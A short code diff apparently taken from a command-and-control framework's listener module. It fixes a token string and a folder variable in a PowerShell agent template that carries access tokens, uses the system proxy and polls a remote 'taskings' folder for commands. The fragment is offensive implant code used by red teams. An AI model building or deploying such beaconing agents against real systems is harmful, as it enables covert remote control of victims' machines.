@@ -385,7 +385,7 @@ class Listener(object):
         if language.lower() == "powershell":
             # Function to generate a WebClient object with the required headers
             token_manager = f"""
-    $Script:TokenObject = @{{token="%{token}";refresh="{refresh_token}";expires=(Get-Date).addSeconds(3480)}};
+    $Script:TokenObject = @{{token="{token}";refresh="{refresh_token}";expires=(Get-Date).addSeconds(3480)}};
     $script:GetWebClient = {{
         $wc = New-Object System.Net.WebClient
         $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
@@ -458,7 +458,7 @@ class Listener(object):
         try {{
             $wc = (& $GetWebClient)
 
-            $TaskingsFolder = "{base_folder}/{results_folder}"
+            $TaskingsFolder = "{base_folder}/{taskings_folder}"
 
             #If we haven't sent a message recently...
             if($script:lastseen.addseconds($script:AgentDelay * 2) -lt (get-date)) {{
